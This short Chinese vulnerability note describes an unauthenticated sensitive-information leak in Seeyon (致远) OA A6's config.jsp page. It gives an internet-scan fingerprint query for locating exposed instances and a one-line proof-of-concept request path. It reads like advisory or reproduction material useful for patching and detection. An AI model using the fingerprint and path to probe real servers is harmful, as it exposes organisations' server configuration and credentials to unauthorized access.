# 致远OA A6 config.jsp 敏感信息泄漏漏洞

## 漏洞描述

致远OA A6 config.jsp页面可未授权访问，导致敏感信息泄漏漏洞，攻击者通过漏洞可以获取服务器中的敏感信息

## 漏洞影响

<a-checkbox checked>致远OA A6</a-checkbox></br>

## 网络测绘

<a-checkbox checked>body="yyoa" && app="致远互联-OA"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1646054177060-6bebaa85-7683-4dd3-8120-39a633481f14.png)

验证POC

```javascript
	/yyoa/ext/trafaxserver/SystemManage/config.jsp
```

![img](../../../.vuepress/public/img/1646054254418-c88d4b28-ec92-4b79-80a4-7f9d4f1421fb.png)